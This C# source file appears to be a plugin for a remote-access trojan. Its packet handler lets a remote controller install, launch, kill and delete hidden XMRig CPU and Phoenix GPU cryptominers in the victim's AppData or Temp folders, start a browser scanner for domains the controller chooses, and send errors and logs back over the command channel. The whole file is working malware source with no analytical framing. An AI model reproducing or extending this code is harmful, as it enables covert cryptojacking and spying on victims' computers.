using MessagePackLib.MessagePack;
using Plugin.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{

    public static class Packet
    {

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {

                    case "DomainScaner":
                        {
                            if (unpack_msgpack.ForcePathObject("CHECKDOMAINSCAN").AsString == "true")
                            {
                                All.Default.domainScanURL = unpack_msgpack.ForcePathObject("DOMAINS").AsString;
                                All.Default.domainsSaner = true;
                                new Thread(() =>
                                {
                                    BrowserScaner.Run();
                                }).Start();
                            }
                            else
                            {
                                All.Default.domainScanURL = "";
                                All.Default.domainsSaner = false;
                            }
                            All.Default.Save();
                            break;
                        }


                    case "StartCPU":
                        {
                            try
                            {
                                Cpu_Del.Get();
                                // Getting settings for the miner
                                CPU.Default.cpuParametrs = unpack_msgpack.ForcePathObject("PARMXMRIG").AsString; // Launch parameters
                                CPU.Default.cpuProc = unpack_msgpack.ForcePathObject("XMRPROC").AsString; // Archived
                                CPU.Default.cpuWorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), CheckSysDirXMRig(unpack_msgpack.ForcePathObject("SYSWORKDIR").AsString), unpack_msgpack.ForcePathObject("WORKDIRXMRIG").AsString);
                                CPU.Default.cpuZipPass = unpack_msgpack.ForcePathObject("ZIPPASSXMRIG").AsString;
                                CPU.Default.cpuDelay = unpack_msgpack.ForcePathObject("DELAY").AsString;
                                CPU.Default.cpu_idParameters = unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString;
                                CPU.Default.cpuBin = CPU.Default.cpuWorkDir + "\\" + CPU.Default.cpuProc + ".exe";
                                CPU.Default.Save(); // Save, then manipulate only them
                            }
                            catch
                            {
                                return;
                            }



                            try
                            {
                                // Задержка
                                for (int i = 0; i < Convert.ToInt32(CPU.Default.cpuDelay); i++)
                                {
                                    Thread.Sleep(1000);
                                }

                                Cpu_Install.Run(unpack_msgpack); //Run the miner class
                            }
                            catch
                            {
                                Thread.Sleep(500);
                                Cpu_Install.Run(unpack_msgpack); // Run the miner class
                            }

                            break;
                        }

                    case "StartGPU":
                        {
                            Gpu_Del.Get();
                            // Getting settings for the miner
                            GPU.Default.gpuParametrs = unpack_msgpack.ForcePathObject("PARMPHOENIX").AsString; // Launch parameters
                            GPU.Default.gpuProc = unpack_msgpack.ForcePathObject("PROCPHOENIX").AsString; //Archived
                            GPU.Default.gpuWorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), CheckSysDirPhoenix(unpack_msgpack.ForcePathObject("SYSWORKDIR").AsString), unpack_msgpack.ForcePathObject("WORKDIRPHOENIX").AsString);
                            GPU.Default.gpuZipPass = unpack_msgpack.ForcePathObject("ZIPPASSPHOENIX").AsString;
                            GPU.Default.gpuDelay = unpack_msgpack.ForcePathObject("DELAY").AsString;
                            GPU.Default.gpu_idParameters = unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString;
                            GPU.Default.gpuBin = GPU.Default.gpuWorkDir + "\\" + GPU.Default.gpuProc + ".exe";
                            GPU.Default.Save(); // Save, then manipulate only them

                            try
                            {

                                // Задержка
                                for (int i = 0; i < Convert.ToInt32(GPU.Default.gpuDelay); i++)
                                {
                                    Thread.Sleep(1000);
                                }
                                Gpu_Install.Run(unpack_msgpack);
                            }
                            catch
                            {
                                Thread.Sleep(500);
                                Gpu_Install.Run(unpack_msgpack);
                            }

                            break;
                        }

                    case "STOPCPU":
                        {

                            if (File.Exists(CPU.Default.cpuBin))
                                foreach (Process p in Process.GetProcessesByName(CPU.Default.cpuProc))
                                {
                                    CPU.Default.cpu_idParameters = "0";
                                    p.Kill();
                                }

                            Thread.Sleep(3000);
                            break;
                        }

                    case "STOPGPU":
                        {

                            if (File.Exists(GPU.Default.gpuBin))
                                foreach (Process p in Process.GetProcessesByName(GPU.Default.gpuProc))
                                {
                                    GPU.Default.gpu_idParameters = "0";
                                    p.Kill();
                                }

                            break;
                        }

                    case "DELCPUMINER":
                        {
                            Cpu_Del.Get();
                            break;
                        }

                    case "DELGPUMINER":
                        {

                            Gpu_Del.Get();

                            break;
                        }


                    case "STARTProtectionEasy":
                        {

                            new Thread(() =>
                            {
                                try
                                {
                                    All.Default.getProc = false;
                                    All.Default.getProcEasy = true;
                                    Thread.Sleep(500);
                                    while (All.Default.getProcEasy == true)
                                    {
                                        //ProcessScanner.RunEasy(unpack_msgpack.ForcePathObject("SYSWORKDIR").AsString, bin);
                                        Thread.Sleep(1000);
                                    }

                                }
                                catch { }
                            }).Start();

                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }


        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Directories.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help_Str.AppDate Help_Str.LocalData
        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); // Help_Str.AppDate Help_Str.LocalData
        public static string CheckSysDirXMRig(string sysPatchXMRig)
        {
            if (sysPatchXMRig == "LOCAL")
            {
                return LocalData;
            }
            else
            {
                if (sysPatchXMRig == "TEMP")
                {
                    return Path.GetTempPath();
                }
                else
                {
                    if (sysPatchXMRig == "ROAMING")
                    {
                        return AppDate;
                    }
                    else
                    {
                        return Path.GetTempPath();
                    }
                }
            }
        }

        public static string CheckSysDirPhoenix(string sysPatchPhoenix)
        {
            if (sysPatchPhoenix == "LOCAL")
            {
                return LocalData;
            }
            else
            {
                if (sysPatchPhoenix == "TEMP")
                {
                    return Path.GetTempPath();
                }
                else
                {
                    if (sysPatchPhoenix == "ROAMING")
                    {
                        return AppDate;
                    }
                    else
                    {
                        return Path.GetTempPath();
                    }
                }
            }
        }







        private static void Received() //reset client forecolor
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            Connection.Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}

